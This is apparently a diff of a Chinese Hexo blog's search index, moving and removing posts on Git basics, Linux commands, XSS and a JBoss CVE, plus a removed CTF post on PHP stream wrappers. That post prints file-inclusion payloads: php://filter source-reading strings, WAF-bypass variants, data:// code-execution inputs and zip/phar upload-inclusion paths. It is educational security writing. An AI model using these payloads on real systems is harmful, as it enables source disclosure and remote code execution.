-<p>以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。</p>
-<h2 id="0x01-安装Git"><a href="#0x01-安装Git" class="headerlink" title="0x01 安装Git"></a>0x01 安装Git</h2><p>在Windows上使用Git，直接从官网上下载<a href="https://git-scm.com/downloads" target="_blank" rel="noopener" title="安装程序">安装程序</a>，然后默认选项安装即可。</p>
-<p>安装完成后，鼠标右键，出现如下图，说明Git安装成功！<br><img src="/posts/55269/1.png" alt></p>
-<p>安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;Your Email&quot;</span><br></pre></td></tr></table></figure>
-<p><strong>注意:</strong> git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
-<h2 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
-<p>创建一个版本库也很简单，选择一个合适的地方，创建一个空目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learnGit</span><br><span class="line">$ cd learnGit</span><br></pre></td></tr></table></figure>
-<p>通过<code>git init</code>命令把这个目录变成Git可以管理的仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in F:&#x2F;PythonProject&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p>这样仓库就建好了，但是里面是空的，其实当前目录下多了一个<code>.git</code>文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。</p>
-<p>如果没有看到.git文件夹，可能是你把它隐藏了，可以用<code>ls -la</code>查看</p>
-<h2 id="0x03-三个工作区"><a href="#0x03-三个工作区" class="headerlink" title="0x03 三个工作区"></a>0x03 三个工作区</h2><ul>
-<li>工作区： 指本地创建的目录，主要保存本地文件</li>
-<li>暂存区： <code>git add</code>之后文件进入的地方，此时文件还没有进入版本库</li>
-<li>版本库： 即仓库，<code>git commit</code>之后，文件从暂存区进入仓库</li>
-</ul>
-<h2 id="0x04-小试牛刀"><a href="#0x04-小试牛刀" class="headerlink" title="0x04 小试牛刀"></a>0x04 小试牛刀</h2><p>我们先编写一个<code>README.txt</code>文件，内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
-<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。</p>
-<p>第一步，用<code>git add &lt;file&gt;</code>把文件添加到仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br></pre></td></tr></table></figure>
-<p>执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
-<p>第二步，用<code>git commit</code>提交文件到仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add a new README.txt file&quot;</span><br><span class="line">[master (root-commit) 6881823] add a new README.txt file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.txt</span><br></pre></td></tr></table></figure>
-<p><code>-m</code>后面是本次提交的说明，可以输入任何内容，也可以不输。</p>
-<p><strong>说明：</strong> <code>git add</code>一次添加一个文件，<code>git commit</code>可以把多次add的文件一次性提交。</p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>今天主要学习如下：</p>
-<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
-<p>添加文件到Git仓库，分两步：</p>
-<ol>
-<li>使用命令git add <file>，注意，可反复多次使用，添加多个文件；</file></li>
-<li>使用命令git commit -m <message>，完成。</message></li>
-</ol>
-<p>这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
-<p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
-<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
-]]></content>
-      <categories>
-        <category>Github</category>
-      </categories>
-      <tags>
-        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -783,6 +733,56 @@
 </li>
 </ol>
 ]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git学习（一）</title>
+    <url>/posts/55269.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
+<p>以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。</p>
+<h2 id="0x01-安装Git"><a href="#0x01-安装Git" class="headerlink" title="0x01 安装Git"></a>0x01 安装Git</h2><p>在Windows上使用Git，直接从官网上下载<a href="https://git-scm.com/downloads" target="_blank" rel="noopener" title="安装程序">安装程序</a>，然后默认选项安装即可。</p>
+<p>安装完成后，鼠标右键，出现如下图，说明Git安装成功！<br><img src="/posts/55269/1.png" alt></p>
+<p>安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;Your Email&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>注意:</strong> git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
+<h2 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
+<p>创建一个版本库也很简单，选择一个合适的地方，创建一个空目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learnGit</span><br><span class="line">$ cd learnGit</span><br></pre></td></tr></table></figure>
+<p>通过<code>git init</code>命令把这个目录变成Git可以管理的仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in F:&#x2F;PythonProject&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<p>这样仓库就建好了，但是里面是空的，其实当前目录下多了一个<code>.git</code>文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。</p>
+<p>如果没有看到.git文件夹，可能是你把它隐藏了，可以用<code>ls -la</code>查看</p>
+<h2 id="0x03-三个工作区"><a href="#0x03-三个工作区" class="headerlink" title="0x03 三个工作区"></a>0x03 三个工作区</h2><ul>
+<li>工作区： 指本地创建的目录，主要保存本地文件</li>
+<li>暂存区： <code>git add</code>之后文件进入的地方，此时文件还没有进入版本库</li>
+<li>版本库： 即仓库，<code>git commit</code>之后，文件从暂存区进入仓库</li>
+</ul>
+<h2 id="0x04-小试牛刀"><a href="#0x04-小试牛刀" class="headerlink" title="0x04 小试牛刀"></a>0x04 小试牛刀</h2><p>我们先编写一个<code>README.txt</code>文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
+<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。</p>
+<p>第一步，用<code>git add &lt;file&gt;</code>把文件添加到仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br></pre></td></tr></table></figure>
+<p>执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
+<p>第二步，用<code>git commit</code>提交文件到仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add a new README.txt file&quot;</span><br><span class="line">[master (root-commit) 6881823] add a new README.txt file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.txt</span><br></pre></td></tr></table></figure>
+<p><code>-m</code>后面是本次提交的说明，可以输入任何内容，也可以不输。</p>
+<p><strong>说明：</strong> <code>git add</code>一次添加一个文件，<code>git commit</code>可以把多次add的文件一次性提交。</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>今天主要学习如下：</p>
+<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
+<p>添加文件到Git仓库，分两步：</p>
+<ol>
+<li>使用命令git add <file>，注意，可反复多次使用，添加多个文件；</file></li>
+<li>使用命令git commit -m <message>，完成。</message></li>
+</ol>
+<p>这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
+<p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
+<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
+]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
       <tags>
         <tag>Git</tag>
       </tags>
@@ -918,66 +918,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux基础命令</title>
-    <url>/posts/60189.html</url>
-    <content><![CDATA[<p>文件操作命令：</p>
-<p>根目录：/</p>
-<p>家目录：/home</p>
-<p>临时目录：/tmp</p>
-<a id="more"></a>
-
-<p>配置目录：/etc</p>
-<p>用户程序目录：/user</p>
-<p>查看目录：ls</p>
-<p>到指定目录：cd</p>
-<p>新建文件：touch 文件名</p>
-<p>新建文件夹：mkdir 文件夹名</p>
-<p>复制：cp 文件1 文件2</p>
-<p>移动：mv</p>
-<p>显示路径：pwd</p>
-<p>删除文件：rm</p>
-<p>删除文件夹：rmdir 文件夹</p>
-<p>　　　　　　rm -r 文件夹    //删除整个文件夹及其内部文件</p>
-<p>　　　　　　rm -rf 文件夹   //强制删除</p>
-<p>用vim新建一个文件：</p>
-<p>　　vim a</p>
-<p>　　按 i 进入insert模式，进行编辑</p>
-<p>　　编辑完按ESC推出insert模式，按 ： 再按 wq 保存推出，q 不保存直接退出</p>
-<p>　　移动到行首和行位：打开大写，输入G跑到行位，恢复到小写，按两次gg跑到行首</p>
-<p>　　删除一行：小写dd，按 u 恢复</p>
-<p>没有鼠标复制：光标在某一行时，按yy，再到指定位置按 p 即可</p>
-<p>：set number 显示行数模式，最后可用cat查看</p>
-<p>文件的权限：777最大权限</p>
-<p>r 是读，w 是写，x 是可执行</p>
-<p>r = 4，w = 2，x = 1</p>
-<p>文件搜索，查找，读取：</p>
-<p>　　从文件尾部读取：tail（一般加上 -f ，实时追踪）</p>
-<p>　　从文件头部读取：head （按住enter键，一行一行往下）</p>
-<p>　　读取整个文件：cat</p>
-<p>　　分页读取：more</p>
-<p>　　可控分页：less</p>
-<p>搜索关键字：grep</p>
-<p>查看当前系统时间：data</p>
-<p>关机：shutdown -h now  //立刻关机</p>
-<p>　　   shutdown -h +10   //10分钟后关机</p>
-<p>　　   shutdown -h 12:00:00   //12点关机</p>
-<pre><code>halt     //立刻关机</code></pre><p>重启：shutdown -r now    </p>
-<p>　　　reboot</p>
-<p>清屏：clear</p>
-<p>用户管理：</p>
-<p>添加用户：useradd 用户名</p>
-<p>passwd 用户名   //设置密码</p>
-<p>userdel -r 用户名      //删除用户及用户主目录</p>
-<p>修改用户：usermod -1 用户1，用户2    //修改用户1位用户2</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JBOSS漏洞复现</title>
     <url>/posts/9957.html</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504"><a href="#0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504" class="headerlink" title="0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)"></a>0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
@@ -1065,6 +1005,66 @@
 <p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
 <p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
 <p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux基础命令</title>
+    <url>/posts/60189.html</url>
+    <content><![CDATA[<p>文件操作命令：</p>
+<p>根目录：/</p>
+<p>家目录：/home</p>
+<p>临时目录：/tmp</p>
+<a id="more"></a>
+
+<p>配置目录：/etc</p>
+<p>用户程序目录：/user</p>
+<p>查看目录：ls</p>
+<p>到指定目录：cd</p>
+<p>新建文件：touch 文件名</p>
+<p>新建文件夹：mkdir 文件夹名</p>
+<p>复制：cp 文件1 文件2</p>
+<p>移动：mv</p>
+<p>显示路径：pwd</p>
+<p>删除文件：rm</p>
+<p>删除文件夹：rmdir 文件夹</p>
+<p>　　　　　　rm -r 文件夹    //删除整个文件夹及其内部文件</p>
+<p>　　　　　　rm -rf 文件夹   //强制删除</p>
+<p>用vim新建一个文件：</p>
+<p>　　vim a</p>
+<p>　　按 i 进入insert模式，进行编辑</p>
+<p>　　编辑完按ESC推出insert模式，按 ： 再按 wq 保存推出，q 不保存直接退出</p>
+<p>　　移动到行首和行位：打开大写，输入G跑到行位，恢复到小写，按两次gg跑到行首</p>
+<p>　　删除一行：小写dd，按 u 恢复</p>
+<p>没有鼠标复制：光标在某一行时，按yy，再到指定位置按 p 即可</p>
+<p>：set number 显示行数模式，最后可用cat查看</p>
+<p>文件的权限：777最大权限</p>
+<p>r 是读，w 是写，x 是可执行</p>
+<p>r = 4，w = 2，x = 1</p>
+<p>文件搜索，查找，读取：</p>
+<p>　　从文件尾部读取：tail（一般加上 -f ，实时追踪）</p>
+<p>　　从文件头部读取：head （按住enter键，一行一行往下）</p>
+<p>　　读取整个文件：cat</p>
+<p>　　分页读取：more</p>
+<p>　　可控分页：less</p>
+<p>搜索关键字：grep</p>
+<p>查看当前系统时间：data</p>
+<p>关机：shutdown -h now  //立刻关机</p>
+<p>　　   shutdown -h +10   //10分钟后关机</p>
+<p>　　   shutdown -h 12:00:00   //12点关机</p>
+<pre><code>halt     //立刻关机</code></pre><p>重启：shutdown -r now    </p>
+<p>　　　reboot</p>
+<p>清屏：clear</p>
+<p>用户管理：</p>
+<p>添加用户：useradd 用户名</p>
+<p>passwd 用户名   //设置密码</p>
+<p>userdel -r 用户名      //删除用户及用户主目录</p>
+<p>修改用户：usermod -1 用户1，用户2    //修改用户1位用户2</p>
 ]]></content>
       <categories>
         <category>Linux</category>
@@ -1283,6 +1283,18 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS学习</title>
+    <url>/posts/21783.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="## 0x00 前言"></a>## 0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
+<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
+<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="## 0x01 反射型XSS"></a>## 0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
+<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
+<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="## 0x02 存储型XSS"></a>## 0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="## 0x03 DOM型XSS"></a>## 0x03 DOM型XSS</h2>]]></content>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web渗透测试-信息收集总结</title>
     <url>/posts/44511.html</url>
     <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>信息收集分为：被动信息收集和主动信息收集。</p>
@@ -1344,18 +1356,6 @@
       </categories>
       <tags>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS学习</title>
-    <url>/posts/21783.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="## 0x00 前言"></a>## 0x00 前言</h2><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
-<p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
-<h2 id="0x01-反射型XSS"><a href="#0x01-反射型XSS" class="headerlink" title="## 0x01 反射型XSS"></a>## 0x01 反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。</p>
-<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
-<h2 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="## 0x02 存储型XSS"></a>## 0x02 存储型XSS</h2><h2 id="0x03-DOM型XSS"><a href="#0x03-DOM型XSS" class="headerlink" title="## 0x03 DOM型XSS"></a>## 0x03 DOM型XSS</h2>]]></content>
-      <tags>
-        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -1454,67 +1454,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php伪协议</title>
-    <url>/posts/3072.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
-
-<p><strong>今天着重研究php://</strong></p>
-<p>有两个比较重要的配置在<code>php.ini</code>中，<code>allow_url_fopen</code> 和<br><code>allow_url_include</code>会影响到<code>fopen</code>等等和<code>include</code>等等函数对于伪协<br>议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<br><code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
-<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说<code>POST</code>请求的情况下，<code>php://input</code>可以获取到post的数据。</p>
-<ul>
-<li><strong>使用条件：include()、include_once()、file_get_contents()</strong></li>
-</ul>
-<p>比较特殊的一点，<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
-<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
-<h3 id="php-filter-重点"><a href="#php-filter-重点" class="headerlink" title="php://filter(重点)"></a>php://filter(重点)</h3><p>这篇文章的关键在于讨论<code>php://filte</code>r,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。</p>
-<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。</p>
-<p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p>事实上，在<code>include</code>函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
-<h2 id="URL中包含点的常见形式"><a href="#URL中包含点的常见形式" class="headerlink" title="URL中包含点的常见形式"></a>URL中包含点的常见形式</h2><ul>
-<li><p><code>?file = xxx 或者 ?file = xxx.php</code></p>
-<p>那么源码中的写法：</p>
-<p><code>include($file.&#39;php&#39;) 或者 include($file)</code></p>
-<p>这里直接使用伪协议包含：</p>
-<p><code>?file=php://filter/read=convert.base64-encode/resource=login</code></p>
-</li>
-<li><p><code>?action = xxx &amp; mode = xxx</code></p>
-<p>这里形式就是文件夹加上文件名的方法</p>
-<p><code>http://www.example.com/index.php?action=front&amp;mode=login</code></p>
-<p>那么源码中的写法：</p>
-<p><code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code></p>
-<p>那么对于这种情况使用的伪协议包含形式：</p>
-<p><code>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login</code></p>
-</li>
-</ul>
-<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>题目链接：<a href="http://level3.tasteless.en/" target="_blank" rel="noopener">http://level3.tasteless.en/</a></p>
-<p>题目直接给出了源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">view file: php.ini</span><br><span class="line">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span><br><span class="line">so there will be something in it which enables you to solve this level, wont?</span><br><span class="line"></span><br><span class="line">always be UP TO DATE!</span><br><span class="line"></span><br><span class="line">hint enough, might just take you seconds to do?!</span><br><span class="line">*&#x2F;</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;anti_rfi.php&#39;); &#x2F;&#x2F;rfi is forbidden!!!!!</span><br><span class="line"></span><br><span class="line">$inc &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">@require_once($inc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>用php://input直接就能执行任意代码<br><img src="/posts/3072/%E4%BC%AA%E5%8D%8F%E8%AE%AE1.jpg" alt></p>
-<h3 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h3><p>在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;login.php（过滤了操作名read）</span><br><span class="line"></span><br><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.jpg&#x2F;resource&#x3D;.&#x2F;show.php（正则 &#x2F;resource&#x3D;*.jpg&#x2F;i）</span><br><span class="line"></span><br><span class="line">?f&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
-
-<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件：</p>
-<ul>
-<li><p>php版本小于5.3.4</p>
-</li>
-<li><p>magic_quotes_gpc为off</p>
-</li>
-</ul>
-<h3 id="截断-1"><a href="#截断-1" class="headerlink" title="./ 截断"></a>./ 截断</h3><p>点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。</p>
-<p>具体可以看下面的文章：<a href="https://blog.csdn.net/zvall/article/details/8951925" target="_blank" rel="noopener">https://blog.csdn.net/zvall/article/details/8951925</a> </p>
-<h2 id="zip协议和phar协议"><a href="#zip协议和phar协议" class="headerlink" title="zip协议和phar协议"></a>zip协议和phar协议</h2><p>在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。</p>
-<p>phar://、zip://，都可以看到在phpinfo中有相应的描述。</p>
-<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>git泄露</title>
     <url>/posts/55935.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做ctf的题，碰到了GitHack，刚好大佬学长有一道这方面的题，拿来练练手。现在总结一下。</p>
@@ -1574,32 +1513,6 @@
       </categories>
       <tags>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php弱类型</title>
-    <url>/posts/21181.html</url>
-    <content><![CDATA[<p>弱类型</p>
-<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
-<a id="more"></a>
-<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
